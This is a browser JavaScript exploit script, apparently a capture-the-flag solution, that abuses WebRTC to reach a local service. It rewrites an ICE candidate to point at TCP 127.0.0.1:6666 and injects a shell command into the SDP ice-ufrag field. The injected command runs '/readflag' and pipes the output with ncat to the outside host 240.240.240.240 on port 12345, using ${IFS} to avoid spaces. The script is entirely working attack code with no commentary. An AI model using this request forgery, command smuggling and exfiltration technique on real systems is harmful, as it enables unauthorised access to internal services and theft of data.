<script>
// Tested on Chromium 76.0.3809.132
// https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/
config={"iceServers":[{"urls":["stun:stun.l.google.com:19302"],"username":"","credential":""}]}

pc1 = new RTCPeerConnection(config);
pc2 = new RTCPeerConnection(config);

pc2.addEventListener('icecandidate', (event) => {
  if (event.candidate) {
    if (event.candidate.type == 'srflx') {
        console.log("before", event.candidate);
        let nr = new RTCIceCandidate({
           candidate: event.candidate.candidate.replace('udp','tcp').replace(event.candidate.address,'127.0.0.1').replace(event.candidate.port, '6666'),
           sdpMid: event.candidate.sdpMid,
           sdpMLineIndex: event.candidate.sdpMLineIndex,
           usernameFragment: event.candidate.usernameFragment
         });
        console.log("after", nr);
        pc1.addIceCandidate(nr).catch(e => {
      console.log("Failure during addIceCandidate(): " + e.name);
    });;
    }
  }
});

ch1 = pc1.createDataChannel(null);

pc1.createOffer().then(offer => {
  console.log("offer", offer.sdp);
  offer.sdp = offer.sdp.replace('ice-ufrag:','ice-ufrag:\r/readflag|ncat${IFS}240.240.240.240${IFS}12345\r');
  pc1.setLocalDescription(offer);
  pc2.setRemoteDescription(offer);
  pc2.createAnswer().then(answer => {
    //answer.sdp = answer.sdp.replace('ice-ufrag:','ice-ufrag:isanswer'); // Or you can replace this
    pc2.setLocalDescription(answer);
    pc1.setRemoteDescription(answer);
  });
});
</script>
